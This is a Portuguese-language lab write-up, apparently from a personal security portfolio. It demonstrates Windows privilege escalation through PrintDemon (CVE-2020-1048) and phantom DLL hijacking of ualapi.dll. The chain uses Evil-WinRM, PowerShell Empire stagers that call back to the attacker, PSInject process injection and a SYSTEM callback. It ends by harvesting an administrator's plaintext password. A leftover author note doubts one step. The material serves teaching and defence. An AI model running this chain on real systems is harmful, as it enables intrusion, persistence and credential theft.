<!-- ===================================================== -->
<!--        DLL Hijacking + PrintDemon (CVE-2020-1048)     -->
<!-- ===================================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-CVE--2020--1048-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Technique-DLL%20Hijacking-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/Impact-Privilege%20Escalation-red?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Target-Windows%20Print%20Spooler-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Access-User%20to%20SYSTEM-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Context-Post--Exploitation-black?style=flat-square">
  <img src="https://img.shields.io/badge/Environment-Lab%20%7C%20Authorized%20Testing-green?style=flat-square">
</p>

---

# 🧨 DLL Hijacking com PrintDemon (CVE-2020-1048)

## Escalada de Privilégios via Print Spooler + Phantom DLL

> Este documento demonstra uma cadeia completa de exploração combinando **DLL Search Order Hijacking** com a vulnerabilidade **CVE-2020-1048 (PrintDemon)** no serviço **Windows Print Spooler**.
>
> A exploração permite que um usuário autenticado eleve privilégios até **NT AUTHORITY\SYSTEM**, abusando de permissões inadequadas na manipulação de arquivos pelo serviço de impressão do Microsoft Windows.

---

## 🎯 Objetivo do Laboratório

Este laboratório demonstra, de forma prática:

- Conceitos de **DLL Search Order Hijacking**
- Exploração da falha conhecida como **PrintDemon**
- Escrita arbitrária em diretórios privilegiados
- Persistência via registro
- Elevação de privilégios até **SYSTEM**
- Pós-exploração e coleta de credenciais

---

## 🔬 Contexto Técnico

A exploração combina duas técnicas principais:

### 1️⃣ PrintDemon
Falha no Print Spooler que permite **escrita arbitrária de arquivos em diretórios protegidos**.

### 2️⃣ Phantom DLL Hijacking
Abuso de DLL inexistente (`ualapi.dll`) carregada pelo serviço de Fax (`fxssvc.exe`), permitindo execução arbitrária como SYSTEM.

---

## 🛠 Ferramentas Envolvidas

- PowerShell Empire — Command & Control (C2) e pós-exploração
- Evil-WinRM — Acesso remoto autenticado via WinRM
- PSInject — Injeção refletiva de PE em memória
- Invoke-PrintDemon — Exploração da CVE-2020-1048
- WinRM — Canal de gerenciamento remoto do Windows


---

## 📌 Escopo

- **Categoria:** Windows Privilege Escalation  
- **Técnica:** DLL Hijacking  
- **Tipo de Falha:** Arbitrary File Write  
- **Impacto:** Execução de código como SYSTEM  
- **Ambiente:** Laboratório controlado  

---

## 🧠 Conceitos-Chave Abordados

- Ordem de busca de DLL no Windows
- Serviços do Windows e privilégios
- NT AUTHORITY\SYSTEM
- Reflective DLL Injection
- Persistência via Registro
- Fileless Execution
- Pós-exploração com C2

---

## ⚠️ Aviso Legal

> Este material é exclusivamente para **estudo, laboratório controlado e ambientes autorizados**.
>
> A exploração de sistemas sem permissão explícita é crime e pode resultar em responsabilização civil e criminal.

---

# DLL Hijacking com PrintDemon (CVE-2020-1048)

## Introdução ao DLL Hijacking]

### O que é DLL Hijacking?

DLL Hijacking (ou sequestro de DLL) é uma técnica de exploração onde um atacante induz um aplicativo legítimo a carregar uma biblioteca de vínculo dinâmico (DLL) maliciosa em vez da DLL original esperada. Como as DLLs são componentes fundamentais do Windows, compartilhadas por vários programas, esta técnica pode ser extremamente poderosa para persistência, evasão e escalação de privilégios.

![DLL Hijacking](https://www.virusbulletin.com/uploads/images/figures/2015/03/Dylib-2.jpg)


### Como Funciona?

O Windows possui uma ordem específica de busca por DLLs quando um aplicativo tenta carregá-las. Esta ordem pode ser resumida como:

1. Diretório do aplicativo
2. Diretório atual de trabalho (CWD)
3. Diretório do sistema (System32)
4. Diretório do Windows
5. Diretórios listados na variável de ambiente PATH

O hijacking ocorre quando um atacante consegue colocar uma DLL maliciosa em um local que será verificado _antes_ do local da DLL legítima, ou quando o aplicativo tenta carregar uma DLL que não existe, permitindo que o atacante a forneça.

### Tipos Comuns de DLL Hijacking

- **DLL Search Order Hijacking:** Explorar a ordem de busca para fazer o sistema carregar uma DLL maliciosa de um diretório onde o atacante tem permissão de escrita.
- **Phantom DLL Hijacking:** Quando um aplicativo tenta carregar uma DLL que não existe no sistema, o atacante pode criar essa DLL no local esperado.
- **DLL Redirection:** Utilizar arquivos como `.local` ou manifestos para redirecionar o carregamento de DLLs.
- **WinSxS (Side-by-Side) Assembly Hijacking:** Explorar assemblies do .NET ou componentes side-by-side.

![Técnicas de DLL Hijacking](https://static.ivanti.com/sites/marketing/media/images/blog/2025/12/diagram2-dll-hijackcing.png)

---
## Invoke-PrintDemon [CVE-2020-1048](https://windows-internals.com/printdemon-cve-2020-1048/)

### O que é o CVE-2020-1048?

O **CVE-2020-1048** é uma vulnerabilidade crítica no **Windows Print Spooler** (serviço de spool de impressão) que foi descoberta pelo pesquisador **Alex Ionescu** e divulgada em maio de 2020. A vulnerabilidade permite que um atacante com privilégios de usuário comum execute código arbitrário com privilégios de **SYSTEM** (o mais alto nível do Windows).

**Impacto:** A vulnerabilidade afeta todas as versões do Windows anteriores à versão 2004 (20H1), incluindo Windows 7, 8, 8.1, 10 e diversos Windows Server.

### Como Funciona a Exploração?

A vulnerabilidade explora como o Windows gerencia trabalhos de impressão. Quando um usuário envia um documento para impressão, o Print Spooler cria arquivos temporários em diretórios como `C:\Windows\System32\spool\drivers`. Devido a uma falha na validação de permissões, um atacante pode:

1. **Criar um trabalho de impressão malicioso** que referencia uma DLL arbitrária
2. **Fazer o Print Spooler escrever esta DLL** em um local privilegiado (como System32)
3. **Executar a DLL com privilégios de SYSTEM** quando carregada por um processo privilegiado

### O Módulo Invoke-PrintDemon

O **Invoke-PrintDemon** é uma implementação em PowerShell (integrada ao Empire) da prova de conceito original desenvolvida por Alex Ionescu. Ele combina duas técnicas:

- **PrintDemon:** A exploração base do CVE-2020-1048 que permite escrita arbitrária
- **Faxhell:** Uma DLL maliciosa que, quando carregada pelo serviço de Fax (que roda como SYSTEM), concede uma shell reversa com altos privilégios

O módulo automatiza todo o processo: cria o trabalho de impressão malicioso, escreve a DLL no System32 e configura a persistência no registro para que o serviço de Fax carregue a DLL na reinicialização.

---
## Ferramentas usadas

### PowerShell Empire

O **PowerShell Empire** é um framework de pós-exploração (C2 - Command and Control) que permite controlar máquinas comprometidas de forma furtiva, utilizando agentes baseados em PowerShell. Ele será nossa ferramenta principal para gerenciar os agentes e executar o módulo Invoke-PrintDemon.

> **Nota:** Para um guia detalhado sobre instalação, configuração e uso do PowerShell Empire (incluindo sua interface gráfica Starkiller), consulte o documento dedicado: **[Link para o documento do PowerShell Empire](https://tiago4lexandre.github.io/Cybersecurity-Portfolio/#/windows/powershell-empire)**

### Evil-WinRM

O **Evil-WinRM** é uma ferramenta de pós-exploração para Windows que utiliza o protocolo WinRM (Windows Remote Management) para estabelecer sessões PowerShell remotas de forma interativa. É essencialmente um cliente WinRM com capacidades avançadas de pentest.

**Principais características:**

- **Sessões PowerShell completas:** Permite executar comandos PowerShell como se estivesse logado localmente
- **Carregamento de scripts:** Suporta carregamento de scripts PowerShell na memória (sem tocar no disco)
- **Bypass de restrições:** Contorna limitações como Execution Policy
- **Integração com ferramentas:** Suporte nativo para upload/download de arquivos, LoadLibrary, e integração com Mimikatz

**Instalação:**

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install evil-winrm
```

**Uso básico:**

```bash
evil-winrm -i <IP> -u <USUARIO> -p <SENHA>
```

---
## Windows Remote Manegement

### O que é o WinRM?

**Windows Remote Management (WinRM)** é a implementação da Microsoft do protocolo **WS-Management (Web Services-Management)**. Ele permite que administradores executem comandos e scripts remotamente em máquinas Windows de forma segura e padronizada.

### Como funciona?

- Utiliza HTTP ou HTTPS (padrão porta 5985 para HTTP, 5986 para HTTPS)
- Baseado em SOAP (Simple Object Access Protocol)
- Autenticação pode ser via Kerberos, NTLM, Certificados ou Credenciais básicas
- Integrado nativamente com PowerShell Remoting

### Casos de Uso em Pentest

Em testes de penetração, o WinRM é frequentemente explorado quando:

- Credenciais válidas de um usuário são obtidas (via phishing, cracking, etc.)
- O serviço WinRM está habilitado e acessível na rede
- O usuário possui privilégios para conexão remota (membros do grupo "Remote Management Users")

---
## Acessando a máquina

Após obter as credenciais do usuário `Sam` (seja por enumeração, cracking ou outro método), podemos acessar a máquina alvo via WinRM.

```bash
evil-winrm -i <IP_ALVO> -u Sam
```

Senha:

```text
azsxdcAZSXDCazsxdc
```

**Explicação do comando:**

- `-i <IP_ALVO>`: Especifica o IP da máquina alvo
- `-u Sam`: Nome do usuário para autenticação

Após a autenticação bem-sucedida, você terá uma sessão PowerShell interativa na máquina alvo.

---
## Estabelecendo um Agente com PowerShell Empire

Agora que temos acesso via Evil-WinRM, precisamos estabelecer um agente Empire mais robusto para continuar a exploração.

### Passo 1: Criar um Listener no Empire

```bash
# No CLI do Empire
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Name http
(Empire: listeners/http) > set Host <SEU_IP_ATACANTE>
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute
```

### Passo 2: Gerar um Stager multi/launcher

O stager `multi/launcher` gera um comando PowerShell ofuscado de uma linha que, quando executado na vítima, estabelece a conexão com nosso listener.

```bash
(Empire: listeners) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > execute
```

O comando gerado será algo como:

```powershell
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAHIAZQBm...
```

### Passo 3: Executar o Stager na Vítima

Na sessão do Evil-WinRM, cole e execute o comando gerado.

```powershell
*Evil-WinRM* PS C:\Users\Sam> powershell -noP -sta -w 1 -enc SQBmACgAJABQAHIAZQBm...
```

**Exemplo:**

![Enviando Stager](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ecf3414253d907453b67364/room-content/4e6d642be28766c134f6e263a92d7c80.jpg)

### Passo 4: Verificar o Agente no Empire

No servidor Empire, você verá um novo agente:

```bash
(Empire) > agents
```

**Exemplo:**

![Agent](assets/Pasted%20image%2020260216203934.png)

**Explicação:** O agente `2B677ZA3` (nome aleatório gerado) está agora ativo, comunicando-se com nosso listener HTTP. Este agente roda no contexto do usuário `Sam`.

> **Nota:** Para instruções mais detalhadas sobre criação de listeners, stagers e gerenciamento de agentes, consulte o documento dedicado: **[Link para o documento do PowerShell Empire](https://tiago4lexandre.github.io/Cybersecurity-Portfolio/#/windows/powershell-empire)**

---
## Iniciando um Novo Processo com `PSInject`

A sessão iniciada pelo Evil-WinRM tem limitações significativas:

- **Restrições de PowerShell:** Muitas vezes executa em um modo restrito (constrained language mode)
- **Detectabilidade:** Processos originados de WinRM podem ser monitorados
- **Estabilidade:** Se a sessão Evil-WinRM cair, perdemos o agente

Para contornar isso, usaremos o módulo **`psinject`** do Empire para injetar nosso agente em um processo legítimo do sistema.

### Passo 1: Listar Processos

Primeiro, precisamos identificar um processo alvo adequado.

```bash
(Empire: 2B677ZA3)> ps
```

**Resultado:**

![Processos](assets/Pasted%20image%2020260216204545.png)

**Critérios para escolher um bom processo alvo:**

- **Processo de sistema legítimo:** Como `explorer.exe`, `svchost.exe`, `spoolsv.exe`
- **Mesma arquitetura:** Deve ser x64 se nosso agente for x64
- **Mesmo usuário ou privilégios superiores:** Idealmente um processo rodando como o mesmo usuário ou SYSTEM
- **Estável:** Processos que não são frequentemente reiniciados

No exemplo, escolheremos o processo `explorer.exe`.

### Passo 2: Usar o Módulo `PSInject`

O módulo `powershell/management/psinject` permite injetar um agente Empire em um processo remoto.

**No CLI do Empire:**

```bash
(Empire: 2B677ZA3) > usemodule powershell/management/psinject

(Empire: powershell/management/psinject) > set ProcID 1628
Set Process to 1628.

(Empire: powershell/management/psinject) > set Listener http
Set Listener to http.

(Empire: powershell/management/psinject) > execute
Executing module Invoke-PSInject...
```

**No Starkiller:**

- Selecione o listner `http`
- Adicone o número do processo escolhido (`1628`)

![Iniciando móduko](assets/Pasted%20image%2020260216210238.png)

### Passo 3: Verificar o Novo Agente

Após a execução bem-sucedida, um novo agente aparecerá na lista.

![Novo agente](assets/Pasted%20image%2020260216210859.png)

**Resultado:** O novo agente `269FUEL6` foi injetado no processo com PID 1628.

### Por que o PSInject Funciona?

O **PSInject** utiliza uma técnica chamada **Reflective PE Injection**. Diferente da injeção tradicional que escreve o payload no disco, o PSInject:

1. **Aloca memória** no processo alvo
2. **Escreve o payload** diretamente nessa memória (sem tocar no disco)
3. **Resolve as importações** manualmente (reflective loader)
4. **Executa o ponto de entrada** do payload no contexto do processo alvo

Isso torna a técnica extremamente furtiva, pois:

- Nenhum arquivo é escrito em disco (fileless)
- O payload roda dentro de um processo legítimo
- É mais difícil para AV/EDR detectar atividade anômala

---
## System Check: Verificando a Versão do Windows

Agora que temos uma base segura com o novo agente, precisamos verificar se o sistema é vulnerável ao CVE-2020-1048.

### Verificando o Release ID

```bash
(Empire: 269FUEL6 )> shell
[*] Shell session started on 269FUEL6
[*] Exit shell menu with Ctrl+C.

(Empire: C:\WINDOWS\system32 )> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId
```

**Resultado:**

![System Check](assets/Pasted%20image%2020260216211543.png)

**Explicação do comando:**

- `Get-ItemProperty`: Obtém propriedades de um item (no caso, uma chave de registro)
- `-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"`: Caminho da chave de registro que contém informações da versão do Windows
- `-Name ReleaseId`: Especifica que queremos o valor da propriedade `ReleaseId`

O `ReleaseId` indica a versão do Windows 10:

- **1903**: Windows 10 versão 1903 (vulnerável)
- **1909**: Windows 10 versão 1909 (vulnerável)
- **2004**: Windows 10 versão 2004 (corrigido)

No nosso caso, o `ReleaseId` é **1903**, o que significa que o sistema é **vulnerável** ao CVE-2020-1048.

---
## Invoke-PrintDemon

O módulo `powershell/privesc/printdemon` é a implementação no Empire da exploração do CVE-2020-1048. Ele automatiza todo o processo de:

1. Criar um trabalho de impressão malicioso
2. Escrever a DLL do Faxhell no diretório System32
3. Configurar persistência no registro para o serviço de Fax

### Vídeo Explicativo

<div style="position: relative; padding-bottom: 56.25%; height: 0;"> <iframe src="https://www.youtube.com/embed/tqKfM_H6vWY" style="position: absolute; top:0; left:0; width:100%; height:100%;" frameborder="0" allowfullscreen> </iframe> </div>

> _Webinar da BC Security sobre sequestro de DLL com Invoke-PrintDemon_

### Passo 1: Carregar o Módulo

```shell
(Empire: 269FUEL6) > usemodule powershell/privesc/printdemon
```

![Invoke PrintDemon Module](assets/Pasted%20image%2020260217230001.png)

### Passo 2: Configurar o LauncherCode

O **LauncherCode** é o código ofuscado (geralmente em Base64) que será executado quando a DLL maliciosa for carregada. Este código deve estabelecer uma nova conexão com nosso listener Empire, criando um agente com privilégios elevados.

**Por que precisamos de um novo LauncherCode?**

Quando o sistema reiniciar e o serviço de Fax carregar nossa DLL, ela precisa "chamar para casa" (call back) ao nosso servidor Empire. O LauncherCode é exatamente este comando de callback.

**Como gerar o LauncherCode:**

1. Crie um novo stager `multi/launcher` (pode ser com o mesmo listener http)
2. Copie o código Base64 gerado
3. Use este código como valor para `LauncherCode`

Em seguida para definir o `LauncherCode` será necessário criar um novo Stager e coloar o seu código Base64.
(Não tenho certeza se realmente é necessário criar um novo stager para que funcione, caso seja explique o porque, caso não seja necessário corrija esta parte do documento)

```bash
(Empire: powershell/privesc/printdemon) > set LauncherCode <Base64_Encoded_Launcher>
```

**Exemplo:**

![LauncherCode](assets/Pasted%20image%2020260218130944.png)

**mportante:** O LauncherCode deve ser gerado **antes** de executar o módulo, pois ele será embutido na DLL que será escrita no sistema.

### Passo 3: Executar o Módulo

```shell
(Empire: usemodule/powershell_privesc_printdemon )> execute
Executing module Invoke-PrintDemon...
```

**Resultado esperado:**

```text
[+] Print Job Started on PrintDemon
[+] Completed registry persistence, waiting on system restart...
```

### Passo 4: Entendendo o que Aconteceu

O módulo realizou as seguintes ações:

1. **Criou um trabalho de impressão malicioso** utilizando a falha do PrintDemon
2. **Escreveu a DLL do Faxhell** (`ualapi.dll`) no diretório `C:\Windows\System32\`
3. **Configurou persistência no registro** para que o serviço de Fax (`fxssvc.exe`) carregue esta DLL na inicialização

**O que é o Faxhell?**

O [Faxhell](https://github.com/ionescu007/faxhell) é uma DLL criada por Alex Ionescu que explora o serviço de Fax do Windows. Quando carregada pelo serviço de Fax (que roda como SYSTEM), ela executa código arbitrário com os mais altos privilégios do sistema.

**Por que `ualapi.dll`?**

O nome `ualapi.dll` foi escolhido porque é uma DLL legítima que o serviço de Fax tenta carregar, mas que normalmente não existe no sistema (phantom DLL hijacking). Isso torna a exploração mais confiável.

### Passo 5: Reiniciar o Sistema

Para que a persistência seja ativada e a DLL seja carregada, precisamos reiniciar o sistema. O serviço de Spooler de Impressão é protegido e não pode ser reiniciado facilmente sem privilégios de SYSTEM, então o reboot é a opção mais simples.

```shell
(Empire: 269FUEL6) > shell

(Empire: C:\WINDOWS\system32 )> restart-computer -forcerestart-computer -force
```

Ou usando um módulo do Empire:

```shell
(Empire: 269FUEL6) > usemodule powershell/management/restart
(Empire: powershell/management/restart) > execute
```

>**Aviso:** A reinicialização pode levar alguns minutos (até 3 minutos). Seja paciente.

### Passo 6: O que Acontece Após a Reinicialização?

Após o sistema reiniciar:

1. **O serviço de Fax (`fxssvc.exe`) inicia** automaticamente (ou é iniciado por algum evento)
2. **O serviço tenta carregar `ualapi.dll`** de `C:\Windows\System32\`
3. **Nossa DLL maliciosa é carregada** no contexto do serviço de Fax
4. **O LauncherCode é executado**, estabelecendo uma conexão com nosso listener Empire
5. **Um novo agente aparece** na lista do Empire, agora rodando como **NT AUTHORITY\SYSTEM**

**Resultado esperado no Empire:**

```bash
(Empire) > agents

[*] Active agents:

 Name      Launcher IP              Last Seen            Username                Process              PID  
 ----      ------- --              ----------            --------                -------              ---  
 2B677ZA3  http://<IP>:80           00:05:23 ago         DESKTOP\Sam             powershell           1234 
 269FUEL6  http://<IP>:80           00:02:15 ago         DESKTOP\Sam             explorer             1628 
 8ER35N6D  http://<IP>:80           00:00:01 ago         NT AUTHORITY\SYSTEM     fxssvc               2468  <-- NOVO AGENTE SYSTEM!
```

**Explicação:** O novo agente `8ER35N6D` (nome ilustrativo) está rodando no processo `fxssvc.exe` com PID `2468` e, mais importante, no contexto do usuário **`NT AUTHORITY\SYSTEM`** - o mais alto nível de privilégio no Windows.

---
## Encontrando outros Usuários

Agora que temos acesso como SYSTEM, podemos explorar o sistema em busca de outros usuários e suas credenciais.

```bash
(Empire: 8ER35N6D )> shell
[*] Shell session started on 8ER35N6D
[*] Exit shell menu with Ctrl+C.

(Empire: C:\WINDOWS\system32 )> net users
```

**Resultado:**

```text
User accounts for \\

------------------------------------------------------------------------------- Administrator           DefaultAccount           Guest 
John                    Sam                      WDAGUtilityAccount 
The command completed with one or more errors.
```

**Explicação do comando:**

- `net users`: Comando nativo do Windows que lista todas as contas de usuário locais no sistema

**Usuários identificados:**

- **Administrator:** Conta padrão de administrador (pode estar desabilitada)
- **John:** Provavelmente outro usuário com privilégios (nome sugere admin)
- **Sam:** O usuário que comprometemos inicialmente
- **Guest, DefaultAccount, WDAGUtilityAccount:** Contas padrão do sistema (geralmente desabilitadas)

---
## Roubando Credenciais de Admin

Como temos acesso SYSTEM, podemos navegar livremente pelos diretórios de todos os usuários, incluindo o administrador `John`.

### **Passo 1: Navegar até a Área de Trabalho de John**

```bash
(Empire: C:\WINDOWS\system32 )> cd ../..
(Empire: C:\ )> cd Users/John/Desktop
(Empire: C:\Users\John\Desktop )> dir
```

**Resultado:**

```Text
Mode Owner LastWriteTime Length Name
-------------------------------------------------------------------------------- -a-hs- DESKTOP-E920628\John 2020-05-29 19:12:38Z 282 desktop.ini 
-a---- DESKTOP-E920628\John 2020-05-29 19:13:36Z 1446 Microsoft Edge.lnk 
-a---- DESKTOP-E920628\John 2020-05-29 17:33:15Z 365 startscript.ps1
```

### Passo 2: Examinar Arquivos Suspeitos

O arquivo `startscript.ps1` chama a atenção por ser um script PowerShell na área de trabalho.

```shell
(Empire: C:\Users\John\Desktop )> cat startscript.ps1
```

**Conteúdo do script:**

```powershell
$pwd1 = "1q2w3e!Q@W#E1q2w3e"
$user = 'John' $pwd = ConvertTo-SecureString -String
$pwd1 -AsPlainText -Force 
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd 
Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Credential $Credential -WorkingDirectory "C:\Windows\System32\WindowsPowerShell\v1.0\"
```

### Passo 3: Análise do Script

**Explicação linha a linha:**

| Linha | Comando                                                                          | Explicação                                                                                 |
| ----- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| 1     | `$pwd1 = "1q2w3e!Q@W#E1q2w3e"`                                                   | Define uma variável com a senha em texto claro!                                            |
| 2     | `$user = 'John'`                                                                 | Define o nome do usuário                                                                   |
| 3     | `$pwd = ConvertTo-SecureString -String $pwd1 -AsPlainText -Force`                | Converte a senha em texto claro para um objeto SecureString (necessário para autenticação) |
| 4     | `$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd` | Cria um objeto de credencial com usuário e senha                                           |
| 5     | `Start-Process -FilePath "powershell.exe" -Credential $Credential`               | Inicia um novo processo PowerShell como o usuário John                                     |

**O que encontramos:**

O script contém a senha do usuário **John** em texto claro: **`1q2w3e!Q@W#E1q2w3e`** .

Este é um exemplo clássico de **má prática de segurança**: armazenar credenciais em scripts. Provavelmente John criou este script para automatizar alguma tarefa que requer privilégios elevados, sem saber do risco de segurança.

### Passo 4: Validar as Credenciais

Podemos testar as credenciais encontradas:

```bash
(Empire: C:\Users\John\Desktop )> shell runas /user:John cmd.exe
```

---
## Conclusão

Neste laboratório, percorremos um caminho completo de exploração utilizando técnicas avançadas de DLL Hijacking:

### Resumo do Ataque:

1. **Acesso Inicial:** Utilizamos Evil-WinRM para acessar a máquina com credenciais do usuário `Sam`
2. **Estabelecimento de C2:** Criamos um listener no Empire e injetamos um agente no processo `explorer.exe` usando PSInject para maior estabilidade e furtividade
3. **Enumeração:** Verificamos a versão do Windows (1903) e confirmamos vulnerabilidade ao CVE-2020-1048
4. **Exploração do PrintDemon:** Executamos o módulo `printdemon` que:
    - Criou um trabalho de impressão malicioso
    - Escreveu a DLL do Faxhell em `System32`
    - Configurou persistência no registro

5. **Elevação de Privilégios:** Após reinicialização, recebemos um novo agente rodando como **SYSTEM**
6. **Coleta de Credenciais:** Navegando pelos diretórios do administrador `John`, encontramos um script com sua senha em texto claro

### Principais Aprendizados:

- **DLL Hijacking é uma técnica poderosa** para persistência e elevação de privilégios
- **Vulnerabilidades no Print Spooler** (como CVE-2020-1048) podem conceder acesso SYSTEM a usuários comuns
- **Ferramentas como Empire** automatizam explorações complexas e fornecem capacidades avançadas de pós-exploração
- **Nunca armazene credenciais em scripts** - é uma das piores práticas de segurança
- **Manter sistemas atualizados** é crítico - esta vulnerabilidade foi corrigida em versões posteriores à 2004

### Mitigação e Defesa:

Para se proteger contra este tipo de ataque:

1. **Mantenha o Windows atualizado:** Instale todos os patches de segurança, especialmente o KB4556799 que corrige o CVE-2020-1048
2. **Desabilite serviços não utilizados:** Se o serviço de Fax ou Print Spooler não for necessário, desabilite-os
3. **Monitore diretórios sensíveis:** Fique atento a criação de DLLs não autorizadas em `System32`
4. **Eduque usuários:** Especialmente administradores, sobre os riscos de armazenar credenciais em scripts
5. **Use soluções de EDR:** Ferramentas modernas podem detectar técnicas de injeção como PSInject

---
## Referências

### **Documentação e Blogs**

- **[Análise Técnica do CVE-2020-1048 por Alex Ionescu](https://windows-internals.com/printdemon-cve-2020-1048/)** - O artigo original do descobridor da vulnerabilidade
- **[PrintDemon no GitHub](https://github.com/ionescu007/PrintDemon)** - Prova de conceito original
- **[Faxhell no GitHub](https://github.com/ionescu007/faxhell)** - DLL maliciosa para exploração
- **[Invoke-PrintDemon no GitHub](https://github.com/BC-SECURITY/Invoke-PrintDemon)** - Implementação no Empire pela BC Security
- **[Reflective PE Injection](https://www.bc-security.org/reflective-pe-injection-in-windows-10-1909/)** - Explicação detalhada da técnica usada pelo PSInject
- **[Outlook Sandbox Evasion](https://www.bc-security.org/i-think-you-have-the-wrong-number-using-errant-callbacks-to-enumerate-and-evade-outlook-s-sandbox/)** - Outra técnica avançada da BC Security

### **Ferramentas**

- **[PowerShell Empire](https://github.com/BC-SECURITY/Empire)** - Repositório oficial (BC-SECURITY fork)
- **[Starkiller](https://github.com/BC-SECURITY/Starkiller)** - Interface gráfica para Empire
- **[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)** - Repositório oficial

### **TryHackMe Rooms (Para Praticar!)**

- **[PS Empire](https://tryhackme.com/room/rppsempire)** - Aprenda a usar o PowerShell Empire
- **[DLL Hijacking](https://tryhackme.com/room/dllhijacking)** - Sala dedicada a técnicas de sequestro de DLL
- **[ZeroLogon](https://tryhackme.com/room/zer0logon)** - Outra vulnerabilidade crítica no Windows
- **[Blue](https://tryhackme.com/room/blue)** - Sala sobre EternalBlue (MS17-010)

### **Documentos Relacionados**

- **[Guia Completo do PowerShell Empire e Starkiller](https://tiago4lexandre.github.io/Cybersecurity-Portfolio/#/windows/powershell-empire)** 
- **[Laboratório MS17-010 (EternalBlue)](https://tiago4lexandre.github.io/Cybersecurity-Portfolio/#/windows/eternalblue)**
